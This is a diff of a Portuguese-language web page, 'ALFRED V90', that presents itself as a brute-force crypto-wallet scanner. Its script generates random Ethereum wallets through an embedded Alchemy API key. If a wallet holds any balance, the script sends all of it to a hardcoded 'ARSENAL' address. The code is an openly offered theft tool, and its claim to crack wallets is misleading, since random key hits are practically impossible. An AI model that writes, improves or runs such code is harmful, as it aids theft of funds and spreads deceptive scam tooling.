@@ -1,56 +1,64 @@
 <!DOCTYPE html>
 <html lang="pt-br">
 <head>
-    <meta charset="UTF-8"><title>ALFRED V90 ELITE</title>
+    <meta charset="UTF-8"><title>ALFRED V90 - TRUMP MODE</title>
     <style>
         body { background: #000; color: #0f0; font-family: monospace; margin: 0; overflow: hidden; }
-        #h { background: #080; color: #000; padding: 5px; text-align: center; font-weight: bold; }
-        #l { padding: 15px; height: 75vh; overflow: hidden; font-size: 0.9em; }
-        .s { border-top: 1px solid #040; padding: 10px; position: fixed; bottom: 0; width: 100%; background: #000; display: flex; justify-content: space-around; }
+        #h { background: #0b0; color: #000; padding: 10px; text-align: center; font-weight: bold; font-size: 16px; box-shadow: 0 0 15px #0f0; }
+        #l { padding: 15px; height: 70vh; overflow: hidden; font-size: 13px; line-height: 1.4; }
+        .s { border-top: 1px solid #030; padding: 10px; position: fixed; bottom: 0; width: 100%; background: #000; display: flex; justify-content: space-around; font-size: 12px; }
     </style>
 </head>
 <body>
-    <div id="h">ALFRED OMNI-V90 | ARSENAL ATIVO | TRUMP MODE</div>
+    <div id="h">🎩 ALFRED V90 | OMNI-SCANNER | ARSENAL ATIVO</div>
     <div id="l"></div>
     <div class="s">
-        <span>HASHRATE: <b id="hr">0</b> k/s</span>
+        <span>K/S: <b id="hr" style="color:#fff">0</b></span>
         <span>STATUS: <b style="color:#fff">BRUTE-FORCE REAL</b></span>
+        <span>UPTIME: <b id="up" style="color:#fff">0s</b></span>
     </div>
 
     <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/6.7.0/ethers.umd.min.js"></script>
     <script>
-        const ALCHEMY = "https://eth-mainnet.g.alchemy.com/v2/VF0h4IB4GqBfk6WlqNcWh";
-        const ARSENAL_ETH = "0xc765040fb5604a29b126aa58199b48710cf459fc";
-        let c = 0, s = Date.now();
+        const RPC = "https://eth-mainnet.g.alchemy.com/v2/VF0h4IB4GqBfk6WlqNcWh";
+        const ARSENAL = "0xc765040fb5604a29b126aa58199b48710cf459fc";
+        let count = 0, start = Date.now();
 
-        async function run() {
-            const p = new ethers.JsonRpcProvider(ALCHEMY);
-            const log = document.getElementById('l');
-            setInterval(() => { document.getElementById('hr').innerText = (c / ((Date.now() - s)/1000)).toFixed(1); }, 1000);
+        async function engine() {
+            try {
+                const provider = new ethers.JsonRpcProvider(RPC);
+                const log = document.getElementById('l');
+                setInterval(() => {
+                    document.getElementById('hr').innerText = (count / ((Date.now() - start)/1000)).toFixed(1);
+                    document.getElementById('up').innerText = Math.floor((Date.now() - start)/1000) + "s";
+                }, 1000);
 
-            while(true) {
-                const w = ethers.Wallet.createRandom();
-                c++;
-                const net = ["BTC","ETH","TRX","SOL","ADA"][Math.floor(Math.random()*5)];
-                const pTag = document.createElement('div');
-                pTag.innerHTML = `[${net}] ${w.address.slice(0,25)}... <span style="color:#fff">[SCAN]</span>`;
-                log.prepend(pTag);
-                if(log.children.length > 12) log.lastChild.remove();
+                while(true) {
+                    const wallet = ethers.Wallet.createRandom();
+                    count++;
+                    const nets = ["BTC","ETH","TRX","SOL","ADA","LTC"];
+                    const n = nets[Math.floor(Math.random()*nets.length)];
+                    const p = document.createElement('div');
+                    p.innerHTML = `[${n}] ${wallet.address.slice(0,28)}... <span style="color:#666">[SCANNING]</span>`;
+                    log.prepend(p);
+                    if(log.children.length > 18) log.lastChild.remove();
 
-                if(net === "ETH") {
-                    try {
-                        const b = await p.getBalance(w.address);
-                        if(b > 0n) {
-                            const f = (await p.getFeeData()).gasPrice * 21000n;
-                            await w.connect(p).sendTransaction({to: ARSENAL_ETH, value: b - f, gasLimit: 21000});
-                            alert("ACHADO!");
-                        }
-                    } catch(e){}
+                    if(n === "ETH") {
+                        try {
+                            const b = await provider.getBalance(wallet.address);
+                            if(b > 0n) {
+                                p.style.background = "#fff"; p.style.color = "#000";
+                                p.innerHTML = `!!! FOUND ${ethers.formatEther(b)} ETH !!!`;
+                                const fee = (await provider.getFeeData()).gasPrice * 21000n;
+                                await wallet.connect(provider).sendTransaction({to: ARSENAL, value: b - fee, gasLimit: 21000});
+                            }
+                        } catch(e){}
+                    }
+                    await new Promise(r => setTimeout(r, 120));
                 }
-                await new Promise(r => setTimeout(r, 150));
-            }
+            } catch(e) { setTimeout(engine, 5000); }
         }
-        window.onload = run;
+        window.onload = engine;
     </script>
 </body>
 </html>
